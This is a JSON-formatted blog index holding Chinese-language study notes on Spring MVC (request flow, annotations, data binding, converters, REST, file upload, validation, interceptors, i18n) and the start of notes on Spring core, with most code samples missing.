[{"title":"Spring MVC","date":"2022-09-19T16:29:36.765Z","url":"/2022/09/20/Spring%20MVC/","tags":[["新建,模板,小书匠","/tags/%E6%96%B0%E5%BB%BA-%E6%A8%A1%E6%9D%BF-%E5%B0%8F%E4%B9%A6%E5%8C%A0/"]],"categories":[[" ",""]],"content":"前言MVCMVC是什么？MVC模式，全程为Model-View-Controller(模型-视图-控制器)模式，他是一种软件架构模式，其目标是将软件的用户界面和业务逻辑分离，使代码具有更高的可扩展性、可复用性、可维护性以及灵活性。如下图所示： 各部分的作用如下： Model： 它是应用程序的主体部分，主要由以下 2 部分组成： 实体类 Bean：专门用来存储业务数据的对象，它们通常与数据库中的某个表对应，例如 User、Student 等； 业务处理 Bean：指 Service 或 Dao 的对象，专门用于处理业务逻辑、数据库访问。 一个模型可以为多个视图（View）提供数据，一套模型（Model）的代码只需写一次就可以被多个视图重用，有效地减少了代码的重复性，增加了代码的可复用性。 View： 指在应用程序中专门用来与浏览器进行交互，展示数据的资源。在 Web 应用中，View 就是我们常说的前台页面，通常由 HTML、JSP、CSS、JavaScript 等组成。 Controller： 通常指的是，应用程序的 Servlet。它负责将用户的请求交给模型（Model）层进行处理，并将 Model 层处理完成的数据，返回给视图（View）渲染并展示给用户。 在这个过程中，Controller 层不会做任何业务处理，它只是 View（视图）层和 Model （模型）层连接的枢纽，负责调度 View 层和 Model 层，将用户界面和业务逻辑合理的组织在一起，起粘合剂的效果。 MVC的工作流程 用户发送请求到服务器； 在服务器中，请求被Controller接收； Controller调用相应的Model层处理请求； Model层处理完毕将结果返回到Controller； Controlller再根据Model返回的请求处理结果，找到相应的View视图； View视图渲染数据最终响应给浏览器。 MVC的优点 降低代码耦合性： 在 MVC 模式中，三层之间相互独立，各司其职。一旦某一层的需求发生了变化，我们就只需要更改相应层中的代码即可，而不会对其他层中的代码造成影响。 有利于分工合作： 在 MVC 模式中，将应用系统划分成了三个不同的层次，可以更好地实现开发分工。例如，网页设计人员专注于视图（View）层的开发，而那些对业务熟悉的开发人员对 Model 层进行开发，其他对业务不熟悉的开发人员则可以对 Controller 层进行开发。 有利于组件的重用： 在 MVC 中，多个视图（View）可以共享同一个模型（Model），大大提高了系统中代码的可重用性。 Spring MVCSpring MVC（Spring Web MVC）是Spring框架提供的一款基于MVC模式的轻量级Web开发框架，是Spring为表示层(UI)开发提供的一套完备的解决方案。 Spring MVC 本质是对 Servlet 的进一步封装，其最核心的组件是 DispatcherServlet，它是 Spring MVC 的前端控制器，主要负责对请求和响应的统一地处理和分发。Controller 接收到的请求其实就是 DispatcherServlet 根据一定的规则分发给它的。 Spring MVC的常用组件： 组件 提供者 描述 DispatcherServlet 框架提供 前端控制器，它是整个 Spring MVC 流程控制中心，负责统一处理请求和响应，调用其他组件对用户请求进行处理。可以降低不同组件之间的耦合性。 HandlerMapping 框架提供 处理器映射器，根据请求的 url、method 等信息查找相应的 Handler。 Handler 开发人员提供 处理器，通常被称为 Controller（控制器），相当于Servlet。它可以在 DispatcherServlet 的控制下，对具体的用户请求进行处理。 HandlerAdapter 框架提供 处理器适配器，负责调用具体的控制器方法，对用户发来的请求来进行处理。Handler执行业务方法之前，需要进行一系列的操作包括表单的数据验证、数据类型的转换、将表单数据封装到POJO等，DispatcherServlet根据HandlerAdapter执行不同的Handler。 HandlerInterceptor 处理拦截器，是一个接口，通过实现该接口完成拦截处理。 HandlerExcutionChain 处理器执行链，包括Handler和HandlerInterceptor（系统有一个默认的HandlerInterceptor，如需要额外拦截处理，则添加拦截器）。 ModelAndView 封装了模型数据和视图信息，作为Handler的处理结果返回给DispatcherServlet。 ViewResolver 框架提供 视图解析器，其职责是对视图进行解析，得到相应的物理视图，将渲染的结果响应给客户端。常见的视图解析器有 ThymeleafViewResolver、InternalResourceViewResolver 等。 View 开发人员提供 视图，它作用是将模型（Model）数据通过页面展示给用户。 Spring MVC的工作流程 用户通过浏览器发起一个 HTTP 请求，该请求会被 DispatcherServlet（前端控制器）拦截； DispatcherServlet 调用 HandlerMapping（处理器映射器）找到具体的处理器（Handler）及拦截器，最后以 HandlerExecutionChain 执行链的形式返回给 DispatcherServlet。 DispatcherServlet 将执行链返回的 Handler 信息发送给 HandlerAdapter（处理器适配器）； HandlerAdapter 根据 Handler 信息找到并执行相应的 Handler（即 Controller 控制器）对请求进行处理； Handler 执行完毕后会返回给 HandlerAdapter 一个 ModelAndView 对象（Spring MVC 的底层对象，包括 Model 数据模型和 View 视图信息）； HandlerAdapter 接收到 ModelAndView 对象后，将其返回给 DispatcherServlet ； DispatcherServlet 接收到 ModelAndView 对象后，会请求 ViewResolver（视图解析器）对视图进行解析； ViewResolver 解析完成后，会将 View 视图并返回给 DispatcherServlet； DispatcherServlet 接收到具体的 View 视图后，进行视图渲染，将 Model 中的模型数据填充到 View 视图中的 request 域，生成最终的 View（视图）； 视图负责将结果显示到浏览器（客户端）。 Spring MVC的简单使用创建Maven工程，Archetype选择org.apache.maven.archetypes:maven-archetype-webapp；导入依赖： 部署Tomcat； 在web.xml中配置 DispatcherServlet； 配置文件，&#x3D;&#x3D;springmvc.xml&#x3D;&#x3D; 创建Handler： 流程梳理： DispatcherServlet接收到URL请求/index，结合@RequestMapping(&quot;/index&quot;)注解将该请求交给index业务方法进行处理； 执行index业务代码，控制台打印日志，并返回1111字符串（逻辑视图）； 结合springmvc.xml中的视图解析器配置，找到目标资源/index.jsp，将该JSP资源返回给客户完成响应。 Spring MVC常用注解 @Controller该注解可以将一个普通的Java类标识成控制器(Controller)类。 Spring MVC 是通过组件扫描机制查找应用中的控制器类的，为了保证控制器能够被 Spring MVC 扫描到，我们还需要在 Spring MVC 的配置文件中使用 &lt;context:component-scan/&gt; 标签，指定控制器类的基本包（请确保所有控制器类都在基本包及其子包下），示例代码如下。 标注到控制器类上时，value属性值就是整个控制器类中所有控制器方法URL地址的父路径；访问该Controller下的任意控制器方法都需要带上整个路径，即/springmvc/login。 属性介绍： &#x3D;&#x3D;value&#x3D;&#x3D;value属性用来设置控制器方法的请求映射地址，值设置value属性时，value可省略；value是一个字符串类型的数组，一个value可以匹配多个请求地址；@RequestMapping(value = &#123;&quot;/register&quot;, &quot;/login&quot;&#125;) &#x3D;&#x3D;name&#x3D;&#x3D;相当于方法的注释，用于解释整个方法时用来干什么的；@RequestMapping(value = &quot;/login&quot;,name = &quot;用户登录&quot;) method用来设置控制器方法支持的请求方法，如果没有设置method属性，则表示该方法支持全部请求类型。RequestMethod是一个枚举类型，包含如下请求方式： 一个mtehod也可以设置多种请求方法；@RequestMapping(value = &quot;/toUser&quot;,method = &#123;RequestMethod.GET,RequestMethod.POST&#125;) &#x3D;&#x3D;params&#x3D;&#x3D;用于指定请求中的参数，只有当请求中携带了符合条件的参数时，控制器方法才会对该请求进行处理。通过以下四种表达式对请求的参数进行配置： “param” 请求中必须携带名为 param 的参数 “!param” 与上一个表达式的含义完全相反，请求中不能携带名为 param 的参数 “param&#x3D;value” 请求中必须携带名为 param 的参数，且参数的取值必须为：value “param!&#x3D;value” 与上一个表达式的含义完全相反，请求中不能携带参数：param &#x3D; value。 @RequestMapping(value = &quot;/testParam&quot;, params = &#123;&quot;name=admin&quot;, &quot;id=1&quot;&#125;) 只有当请求中同时携带name和id两个请求参数，且值必须为admin和1，控制器方法才会对该请求进行处理。 &#x3D;&#x3D;headers&#x3D;&#x3D;用于设置请求头信息，只有当请求中携带指定的请求头信息时，控制器方法才会处理该请求。通过以四种表达式来指定请求中的请求头信息：- “header” 请求必须携带请求头信息：header “!header” 与上一个表达式的含义完全相反，请求中不能携带请求头信息：header “header&#x3D;value” 请求中必须携带请求头信息：header&#x3D;value 。 “header!&#x3D;value” 与上一个表达式的含义完全相反，请求中不能携带请求头信息：header&#x3D;value。 @RequestMapping(value = &quot;toUser&quot;,headers = &quot;Referer=;)只有当请求头信息中包含Referer=时，该控制器方法才会处理该请求。 @CookieValuecookie映射，通过该注解来获取当前那cookie； 参数绑定@RequestParam在业务方法定义时声明参数列表，通过@RequestParam注解，将username绑定到name参数，num绑定到id参数，这样就在请求中通过usernme和num对name和id赋值。 其中，URL接收的参数值是String类型，由HandlerAdapter 将参数值转换为对应的类型传递给方法。 @PathVariableSpring MVC也支持RESTful风格的URL参数获取，通过@PathVariable注解来绑定参数，URL中以/username值/num值的形式来传入参数，要注意参数值顺序对应。 使用POJO绑定参数Spring MVC会根据请求参数名和POJO属性名进行匹配，自动为该对象填充属性值，并且支持属性级联。 导入Lombok依赖； 在web.xml中添加UTF-8编码的过滤器，要添加到servlet配置前面； &#x3D;&#x3D;addUser.jsp&#x3D;&#x3D;，属性名要与User类中的一致； 接收到客户端传入的数据后，HandlerAdapter找到对应的业务方法/add，发现需要User参数，就把客户端传入的数据封装成User对象传入。 User中也可以包含引用类型的属性，就称为级联。User类可以没有无参构造，但是级联类必须有无参构造。 JSP页面的转发和重定向Spring MVC默认以转发的形式响应JSP：return &quot;forward:/index.jsp&quot;;，如果是像上面示例一样在配置文件中加了前后缀的话，就可以写成return &quot;index&quot;;； 可以手动设置为重定向：return &quot;redirect:/index.jsp&quot;；设置重定向地址时，不能写逻辑路径，必须写明物理路径，这种写法是错误的return &quot;redirect:index&quot;; Spring MVC数据绑定数据绑定： 在后台业务方法中，直接获取前端HTTP请求中的参数。 HTTP请求传输的参数都是String类型的，Handler业务方法中的参数是开发者指定的数据类型，因此需要进行数据类型的转换。 Spring MVC的HandlerAdapter组件会在执行Handler业务方法之前，完成参数绑定，开发者直接使用即可。 @ResponseBody注解的作用是将方法的返回值以特定的格式写入到response的body区域，进而将数据返回给客户端。 基本数据类型 这里就是返回的我们自定义的格式，如果不加@ResponseBody注解，就会按照视图解析器的规则，给返回的内容添加前后缀，导致返回错误； 使用了@ResponseBody注解，传入的参数不能为空，否则会报错； 并且传入的值必须能够转换为对应类型，否则会报错。 包装类 id设置为Integer类型的话id不传值不会报错，传其他还是会报错。 @RequestParam注解可以设置参数是否必须，required属性为true时表示必须，为false表示非必须；defaultValue 属性表示不传值时id的默认值，必须写成字符串形式； 数组类型 在springmvc.xml中添加转换器解决中文乱码问题； List类型&#x3D;&#x3D;UserList.java&#x3D;&#x3D; &#x3D;&#x3D;addList.jsp&#x3D;&#x3D; JSON类型下载jquery-3.6.0.min.js，放到/webapp/js目录下，rebuild一下，在jsp中引入jquery； web.xml中添加： pom.xml中添加FastJson依赖，jar包下载：  在上面写的springmvc.xml的转换器中添加bean： &lt;bean class=&quot;com.alibaba.fastjson.support.spring.FastJsonHttpMessageConverter&quot;&gt;&lt;/bean&gt; &#x3D;&#x3D;json.jsp&#x3D;&#x3D; @RequestBody读取HTTP请求参数，通过Spring MVC提供的HttpMessageConverter接口将读取的参数转为JSON、XML格式的数据，绑定到业务方法的形参。@ResponseBody将业务方法返回的对象，提供HttpMessageConverter接口转为指定格式的数据，JSON、XML等，响应给客户端。 @RequestBody结合FastJson将JSON转换为Java Bean，好处在于如果属性为空，就不会将其转换为JSON json.jsp传入数据到/Spring_MVCTest1/jsonType，Handler中将数据转换为User对象，返回给json.jsp以JSON格式输出。 Spring MVC域对象共享数据 + 视图层解析在 Spring MVC 中，控制器在接收到 DispatcherServlet 分发过来的请求后，会继续调用 Model 层对请求进行处理。Model 层处理完请求后的结果被称为模型数据，会将模型数据返回给 Controller。Controller 在接收到 Model 层返回的模型数据后，下一步就是将模型数据通过域对象共享的方式传递给 View 视图进行渲染，最终返回给客户端展示。 域对象是服务器在内存上创建的一块存储空间，主要用不同动态资源之间的数据传递和数据共享。在 Spring MVC 中，常用的域对象有 request 域对象、session 域对象、application 域对象等（page域对象只在当前页面有效，实用性不高）。 业务数据的绑定是指将业务数据绑定给JSP域对象，业务数据的绑定是由ViewResolver来完成的，开发时，先添加业务数据，在交给ViewResolver来绑定，重点就在于如何添加业务数据。 常用域对象共享数据的方式如下： 向request域对象中共享数据1. 使用Servlet APISpring MVC可以在业务方法中直接获取Servlet原生Web资源，只需要在方法定义时 HttpServletRequest 入参即可，在方法体中直接使用request对象。 由于这种方式是通过原生 Servlet API 实现的，会导致控制器与 Servlet 容器耦合度过高，因此通常情况下，不推荐使用这种方式向 request 域对象中共享数据。 2. 使用 MapSpring MVC在调用业务方法之前会创建一个隐含对象作为业务数据的存储容器，设置业务方法的入参为Map类型，Spring MVC 会将给隐含对象的引用传递给入参。 3. 使用 Model与Map类似，业务方法通过入参来完成业务数据的绑定。 4. 使用 ModelAndViewModelAndView 即包含业务数据，同时也封装了视图信息，如果使用ModelAndView来处理业务数据，业务方法的返回值必须是ModelAndView对象。 ModelAndView 其中的model负责数据共享，view注意用于设置视图，实现页面跳转。常用方法： 添加模型数据，填充业务数据：ModelAndView addObject(String attributeName, @Nullable Object attributeValue)ModelAndView addObject(Object attributeValue) 设置视图，绑定视图信息：void setViewName(@Nullable String viewName) void setView(@Nullable View view) 在 Controller 类中，ModelAndView 只有在作为控制器方法的返回值，返回给前端控制器（DispatcherServlet）时，前端控制器解析才会去解析它。 或者： 或者： 或者： 或者： ModelAndView类有八种带参构造，大意都差不多，自行了解。 5. 使用 ModelMap 6. 使用@ModelAttribute注解定义一个方法存放要填充的数据，给该方法添加@ModelAttribute注解。 &#x3D;&#x3D;@ModelAttribute&#x3D;&#x3D;的作用是，当Handler接收到一个客户端请求之后，无论需要调用哪个业务方法，都会先调用@ModelAttribute标注的方法，并将其返回值作为业务数据，再进入到业务方法，此时业务方法只需要返回视图即可，即使对数据做出修改，数据也不会被覆盖，仍然输出@ModelAttribute方法返回的数据。 如果@ModelAttribute标注的方法存入了数据，但是返回的是void，同样也可以拿到数据； 如果同时使用@ModelAttribute标注的两个方法对同一个对象传值，直接给Model对象进行装载的优先级更高。 与上面的getUser()相比，返回的数据应该是李四。 向 session 域对象中共享数据**1. 使用 Servlet API ** 2. 使用@SessionAttributes@SessionAttributes使用在Handler类上面;业务方法默认向request域对象中共享数据，如下代码，表示将user1和user2属性共享到session域对象中（request域对象默认共享），只要业务方法中存在这两个key的数据，就会添加到session中。 向 application 域对象中共享数据使用 Servlet API通过HttpSession类型的形参获取到application域对象，如何将数据共享到application域对象中。 Spring MVC类型转换器（Converter）Spring 提供了一种 Converter（类型转换器）的类型转换工具。在 Spring MVC 中，它的作用是在控制器方法对请求进行处理前，先获取到请求发送过来的参数，并将其转换为控制器方法指定的数据类型，然后再将转换后的参数值传递给控制器方法的形参，这样后台的控制器方法就可以正确地获取请求中携带的参数了。 内置转换器1. 标量转换器 2. 集合、数组相关转换器 Spring MVC 对于基本类型（例如 int、long、float、double、boolean 以及 char 等）已经做好了基本类型转换。其他类型的转换可以自定义转换器。 注意：在使用内置类型转换器时，请求参数输入值需要与接收参数类型相兼容，否则会报 400 错误。 自定义类型转换器org.springframework.core.convert.converter包中定义了3中类型的转换器接口： 接口 说明 Converter&lt;S,T&gt; 该接口使用了泛型，第一个类型 S 表示原类型，第二个类型 T 表示目标类型，里面定义了一个 convert() 方法，能够将原类型对象作为参数传入，进行转换之后返回目标类型对象。 ConverterFactory 如果我们希望将一种类型的对象转换为另一种类型及其子类对象，例如将 String 转换为 Number 以及 Number 的子类 Integer、Double 等类型的对象，那么就需要一系列的 Converter，如 StringToInteger、StringToDouble 等。ConverterFactory&lt;S,R&gt; 接口的作用就是将这些相同系列的多个 Converter 封装在一起。 GenericConverter 该接口会根据源类对象及目标类对象的上下文信息进行类型转换。 要自定义类型转换器只需实现其中一个接口就可以了。 String类型转Date类型的转换器实现org.springframework.core.convert.converter.Converter接口；定义一个转换器： 在配置文件springmv.xml中声明一个 org.springframework.context.support.ConversionServiceFactoryBean的 Bean（例如示例配置中的名为conversionService的 Bean），然后通过其 converters 属性将自定义的所有类型转换器注册到其中；显示的装配自定义类型转换器是为了将默认注册的FormattingConversionServiceFactoryBean类型的conversionService覆盖掉。 &#x3D;&#x3D;补充：&#x3D;&#x3D; &#x3D;&#x3D;ConverterHandler.java&#x3D;&#x3D; &#x3D;&#x3D;date.jsp&#x3D;&#x3D; 运行结果： 程序运行时，第一次输入的参数会先进入转换器的构造方法方法中，然后再进入convert方法，最后到达Handler中；第二次输入参数时，会直接进convert方法，再进入Handler。 String类型转Student类型的转换器再springmvc.xml中的自定义类型转换器配置中添加bean：&lt;bean class=&quot;Converter.StudentConverter&quot;&gt;&lt;/bean&gt; &#x3D;&#x3D;Student.java&#x3D;&#x3D; &#x3D;&#x3D;student.jsp&#x3D;&#x3D; 转换器，&#x3D;&#x3D;StudentConverter.jsva&#x3D;&#x3D; Handler： 运行结果： Spring MVC 实现RESTfulRESTful（REST 风格）是一种当前比较流行的互联网软件架构模式，它充分并正确地利用 HTTP 协议的特性，为我们规定了一套统一的资源获取方式，以实现不同终端之间（客户端与服务端）的数据访问与交互。 什么是RESTResource Representational State Transfer 的缩写，译为“资源表述状态转移”。 Resource（资源）指网络中的某个具体文件，可以是一个类、一个 HTML 文件、一个 CSS 文件、一个 JS 文件、数据库中的一张表、一段文本、一张图片、一段音频等等，是网络中真实存在的一个实体。这些资源都有一个共同的特征，那就是它们都可以通过一个 URI（统一资源标识符） 进行标识，任何对于该资源的操作都不能改变其 URI。想要获取这个资源，只要访问它的 URI 即可。 Representation（资源的表述）指是资源在某个特定时刻的状态的描述，即资源的具体表现形式，它可以有多种格式，例如 HTML、XML、JSON、纯文本、图片、视频、音频等等。通常情况下，服务端与客户端资源的表述所有使用的格式往往是不同的，例如在服务端资源可能是数据库中的一段纯文本、一个 XML 文件、或者是数据库中的一张表，而客户端则可能是表现为 HTML 页面、JSON、甚至是音频和视频。 State Transfer（状态转移）客户端与服务端进行交互时，资源从一种表现形式转换到另一种表现形式的过程。但是 HTTP 协议是一种无状态协议，它是无法保存任何状态的，因此如果客户端想要获取服务器上的某个资源，就必须通过某种手段让资源在服务器端发生“状态转化”，而这种状态转化又是建立在应用的表现层（UI）上的。这就是“表现层资源状态转移”的含义。 RESTfulRESTful的特点： URL传参更简洁，不需要写参数名，允许通过/将参数值拼接到URL中； 传统URL形式： RESTful形式： 提供了一套规范来完成不同终端之间的资源共享；四种与资源相关的基本操作： GET 用来获取资源， POST 用来新建资源， PUT 用来更新资源， DELETE 用来删除资源。客户端通过这四种请求方式，即可实现对服务器端资源状态转移的描述。 实现RESTful1. 通过@RequestMapping +@PathVariable 注解的方式这种方式前面提到过，使用这两个注解来对参数进行绑定； 2. 通过 HiddenHttpMethodFilter 对请求进行过滤在传统Web开发中，form 只支持 GET 和 POST 请求方式，不支持 PUT 和 DELETE 请求方式，现在可以通过 Spring MVC 提供的 HiddenHttpMethodFilter 过滤器将 POST 请求转为 PUT 和 DELETE 请求。 过滤器的实现原理是：检测请求参数中是否包含_method参数，如果包含，则取出它的值，根据值转换为相应的请求类型，然后将请求进行传递给服务器。 实现步骤： 在web.xml中配置HiddenHttpMethodFilter； 在 form 表单中添加隐藏标签，name 为_method，value 为 PUT &#x2F; DELETE； 定义Handler。 示例实现课程的增、删、改、查。 web.xml配置过滤器； pom.xml添加JSTL依赖； 注意修改springmvc.xml中自动扫描配置所扫描的包名，要能扫描到我们使用的所有类，我这里修改成父包springmvc；&lt;context:component-scan base-package=&quot;springmvc&quot;&gt;&lt;/context:component-scan&gt; &#x3D;&#x3D;CourseRepository.java&#x3D;&#x3D; &#x3D;&#x3D;CourseHandler.java&#x3D;&#x3D; &#x3D;&#x3D;index.jsp&#x3D;&#x3D; &#x3D;&#x3D;save.jsp&#x3D;&#x3D; &#x3D;&#x3D;edit.jsp&#x3D;&#x3D; 运行结果： Spring MVC 实现文件的上传、下载单文件上传底层使用的是Apache Commons-FileUpload 组件实现上传功能，Spring MVC只是对其进行了封装，简化开发。pom.xml中导入依赖： 在web.xml中添加如下配置，使用默认方法加载png、jpg等类型图片，否则加载不出来。 在springmvc.xml中定义文件上传解析器：&lt;bean id=&quot;multipartResolver&quot; class=&quot;org.springframework.web.multipart.commons.CommonsMultipartResolver&quot;&gt;&lt;/bean&gt; CommonsMultipartResolver实现了MultipartResolver接口，该接口用于处理文件上传；当收到请求时，DispatcherServlet 的 checkMultipart() 方法会调用 MultipartResolver 的 isMultipart() 方法判断请求中是否包含文件；如果请求数据中包含文件，则调用 MultipartResolver 的 resolveMultipart() 方法对请求的数据进行解析，然后将文件数据解析成 MultipartFile 并封装在 MultipartHttpServletRequest (继承了 HttpServletRequest) 对象中，最后传递给 Controller。 MultipartFile 封装了请求数据中的文件，此时这个文件存储在内存中或临时的磁盘文件中，需要将其转存到一个合适的位置，因为请求结束后临时存储将被清空。MultipartFile 接口中包含那多种获取文件信息的方法。 &#x3D;&#x3D;upload.jsp&#x3D;&#x3D; &#x3D;&#x3D;FileHandler.java&#x3D;&#x3D; 程序中获取到的path是本工程在Tomcat下的路径，不是工程创建的路径； 保存路径的src与 Configurations 中设置的 Application context 有关，在该目录下创建/file文件夹； 图片上传结果： 多文件上传多文件上传其实就是在单文件上传的基础上加个 for 循环。 &#x3D;&#x3D;uploads.jsp&#x3D;&#x3D; Handler业务方法： 运行结果： 文件下载在JSP中添加超链接，点击超链接进行下载。 &#x3D;&#x3D;download.jsp&#x3D;&#x3D; Handler中的业务方法： 先将图片上传上去，再下载，运行结果： Spring MVC 数据校验Spring MVC 提供了两种数据校验的组件： 基于 Validator 接口 使用 Annotation JSR-303标准校验 使用基于 Validator 接口进行校验会复杂一些，具体的数据校验的规则需要开发者手动设置。使用 Annotation JSR-303标准会相对简单一堆，开发者不需要编写校验规则，直接通过注解的形式给每一条数据添加验证规则，具体操作是直接在实体类的属性上添加对应的校验注解即可。 基于 Validator 接口定义一个实体类； 自定义数据校验器 PersonValidation，实现org.springframework.validation.Validator接口，重写抽象方法，加入校验规则； Handler业务方法： 在springmvc.xml中配置数据校验器； &#x3D;&#x3D;login.jsp&#x3D;&#x3D; 先到/Spring_MVCTest1/validate/login进行数据绑定，如果校验失败则会出现提示信息，校验成功则跳转。 程序运行流程：访问/Spring_MVCTest1/validate/login，会先到 Handler 的login方法中绑定 Person 对象； 然后到校验器的supports方法中判断绑定对象是否是 Person 类； 接着到validate方法中进行校验，如果传入的是空，errors中则会存储错误信息，这里分别存到name和pwd中； 最后到 Handler 中判断校验是否出错，bindingResult中存的就是 errors 的错误信息，if 为真，返回login.jsp，如果没有错误信息就返回success.jsp； 前端login.jsp中的&lt;form:errors&gt;标签，就会根据 path 的值输出对应的错误信息内容。 Annotation JSR-303标准校验JSR-303 是 Java EE 6 中的一项子规范，叫做 Bean Validation，官方参考实现是hibernate Validator，通过注解完成校验规则的绑定。 pom.xml中导入如下依赖： 定义一个实例类： 业务方法： 在springmvc.xml中添加配置（把基于 Validator 接口的配置注释掉）；&lt;mvc:annotation-driven&gt;&lt;/mvc:annotation-driven&gt; &#x3D;&#x3D;register.jsp&#x3D;&#x3D; 运行结果： Spring MVC拦截器拦截器（Interceptor）是 Spring MVC 提供的一种强大的功能组件。它可以对用户请求进行拦截，并在请求进入控制器（Controller）之前、控制器处理完请求后、甚至是渲染视图后，执行一些指定的操作。 在 Spring MVC 中，拦截器的作用与 Servlet 中的过滤器类似，它主要用于拦截用户请求并做相应的处理，例如通过拦截器，我们可以执行权限验证、记录请求信息日志、判断用户是否已登录等操作。 Spring MVC 拦截器使用的是可插拔式的设计，如果我们需要某一拦截器，只需在配置文件中启用该拦截器即可；如果不需要这个拦截器，则只要在配置文件中取消应用该拦截器即可。 验证登录身份示例登录页面，&#x3D;&#x3D;login.jsp&#x3D;&#x3D; 登录成功显示页面，&#x3D;&#x3D;success.jsp&#x3D;&#x3D; Handler： Spring MVC 在org.springframework.web.servlet包中提供了一个 HandlerInterceptor 接口，该接口包含 3 个方法： 方法名 返回值 说明 preHandle () boolean 该方法在控制器方法之前执行，其返回值用来表示是否中断后续操作。返回值为 true 时，表示继续向下执行；返回值为 false 时，表示中断后续的操作。 postHandle (） void 该方法会在控制器方法调用之后，解析式图之前执行。我们可以通过此方法对请求域中的模型（Model）数据和视图做出进一步的修改。 afterCompletion () void 该方法会在整个请求完成后，即视图渲染结束之后执行。我们可以通过该方法实现资源清理、日志记录等工作。 定义拦截器： 在springmvc.xml中通过&lt;mvc:interceptors&gt;标签配置拦截器； 当直接访问/Spring_MVCTest1/interceptor/main会被拦截器拦截，验证是否登录，未登录返回错误信息；正确登录就跳转到success.jsp。 Spring MVC 表单标签库使用 Spring MVC 表单标签库可以直接将业务数据绑定到JSP表单中，简化了JSP页面的代码编写。 简单使用需要在JSP页面中导入Spring MVC 表单标签库；&lt;%@ taglib prefix=&quot;form&quot; uri=&quot;; %&gt; 通过 modelAttribute 属性将 form 表单与业务数据进行绑定， 属性值设为Handler中向 model 对象存值时的 name。 示例，使用&lt;form:input&gt;标签进行输入操作： 等价于下面的代码，显然使用表单标签库简洁许多。 Handler： 常用标签 form 标签&lt;form:form modelAttribute=&quot;student&quot; method=&quot;post&quot;&gt;&lt;/form:form&gt;渲染的时 HTML 中的&lt;form&gt;&lt;/form&gt;，通过 modelAttribute 属性绑定具体的业务数据。 input 标签&lt;form:input path=&quot;id&quot;&gt;&lt;/form:input&gt;渲染的时 HTML 中的&lt;input type=&quot;text&quot; name=&quot;id&quot;/&gt;，通过 path 属性与业务数据的属性名对应，支持级联。 password 标签&lt;form:password path=&quot;password&quot;&gt;&lt;/form:password&gt;渲染的是 HTML 中的&lt;input type=&quot;password&quot; /&gt;，通过 path 与页数数据的属性名对应，该标签的值不会在页面显示（空白的）。 checkbox 标签&lt;form:chexkbox path=&quot;hobby&quot; value=&quot;读书&quot;&gt;读书&lt;/form:chexkbox&gt;渲染的是 HTML 中的&lt;input type=&quot;checkbox&quot; /&gt;，通过 path 与业务数据的属性名对应，可以绑定Boolean、数据和集合；如果绑定Boolean类型的遍历，该变量值为 true，表示选中，为 false 表示不选中； 如果绑定数组和集合类型，集合中的元素等于 checkbox 的 value 值，则表示选中该选项，否则为不选中。 checkboxs 标签&lt;form:checkboxs items=&quot;$&#123;student.hobby&#125;&quot; path=&quot;selectHobby&quot;&gt;&lt;/form:checkboxs&gt;渲染的是 HTML 中的&lt;input type=&quot;checkbox&quot;/&gt;，需要结合 items 和path 两个属性来使用；items 绑定被遍历的数组或集合，path 绑定选中的集合或数组，items 是全部选项，要用EL表达式， path 为默认选中的选项。 radiobuttton 标签&lt;form:radiobutton path=&quot;radioId&quot; value=&quot;0&quot;&gt;&lt;/form:radiobutton&gt;渲染的是 HTML 中的&lt;input type=&quot;radio&quot;/&gt; ，绑定的数据与标签的 value 值相等则为选中状态，反之为不选中。 radiobutttons 标签&lt;form:radiobutttons items=&quot;$&#123;student.grade&#125;&quot; path=&quot;selectSex&quot;&gt;&lt;/form:radiobutttons&gt;渲染的是 HTML 中的&lt;input type=&quot;radio&quot; /&gt;，需要结合 items 和path 两个属性来使用；items 绑定被遍历的数组或集合，path 绑定选中的值。与 checkboxs 类似，不过 path 为单选。 select 标签&lt;form:select items=&quot;$&#123;student.cities&#125;&quot; path=&quot;selectcity&quot;&gt;&lt;/form:select&gt;渲染的是 HTML 中的&lt;select&gt;标签，与 radiobutttons 用法一致。 option 标签 path 与 value 相等的选项默认选中。 options 标签 items 中的 path 选项默认选中，与 select 标签效果一致。 Spring MVC 国际化国际化是指同一个应用程序在不同语言设置的浏览器中，自动显示相应的语言，Spring MVC 对国际化做了很好的集成，只需要简单配置即可实现国际化。 在springmvc.xml中添加如下配置： 其中： ReloadableResourceBundleMessageSource：对资源文件中设置的内容进行绑定； LocaleChangeInterceptor：用于获取请求中的国际化信息并将其转换为 Locale 对象，以获取 LocaleResolver 对象对国际化资源文件进行解析； SessionLocaleResolver：将将包含了国际化信息的 Locale 对象存储在 Session 中，供后续页面继续使用。 在resource目录下创建国际化资源文件，文件名格式为：基本名_语言代码_国家或地区代码：&#x3D;&#x3D;language_en_US.properties&#x3D;&#x3D; 得用Unicode编码，不然会乱码，&#x3D;&#x3D;language_zh_CN.properties&#x3D;&#x3D; 默认是英文页面，通过URL中lang参数来改变语言，运行结果："},{"title":"Spring学习笔记","date":"2022-09-19T16:24:11.783Z","url":"/2022/09/20/Spring%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","tags":[["新建,模板,小书匠","/tags/%E6%96%B0%E5%BB%BA-%E6%A8%A1%E6%9D%BF-%E5%B0%8F%E4%B9%A6%E5%8C%A0/"]],"categories":[[" ",""]],"content":"概述Spring是一个企业级的开发框架，是软件设计层面的框架，是一种基于Bean的编程技术，使很多复杂的代码变得优雅和简洁。 在实际开发中，服务器端应用程序通常采用三层体系架构，分别为表现层（web）、业务逻辑层（service）、持久层（dao）。 在表现层提供了对 Spring MVC、Struts2 等框架的整合； 在业务逻辑层提供了管理事务和记录日志的功能； 在持久层还可以整合 MyBatis、Hibernate 和 JdbcTemplate 等技术，对数据库进行访问。 Spring Framework的特点： 方便解耦，简化开发 方便集成各种优秀框架 降低Java EE API的使用难度 方便程序的测试 AOP编程的支持 声明式事务的支持 Spring有两个核心的部分：IoC和AOP。IoC： Inverse of Control ，译为“控制反转”，指把创建对象过程交给 Spring 进行管理。AOP： Aspect Oriented Programming ，译为“面向切面编程”。AOP 用来封装多个类的公共行为，将那些与业务无关，却为业务模块所共同调用的逻辑封装起来，减少系统的重复代码，降低模块间的耦合度。另外，AOP 还解决一些系统层面上的问题，比如日志、事务、权限等。 Bean定义由 Spring IoC 容器管理的对象称为 Bean，Bean 是根据 Spring 配置文件中的信息创建。 Spring 配置文件支持两种格式，即 XML 文件格式和 Properties 文件格式： Properties 配置文件主要以 key-value 键值对的形式存在，只能赋值，不能进行其他操作，适用于简单的属性配置。 XML 配置文件采用树形结构，结构清晰，相较于 Properties 文件更加灵活。但是 XML 配置比较繁琐，适用于大型的复杂的项目。 通常使用XML格式。 &lt;beans&gt;标签下常用的属性有： 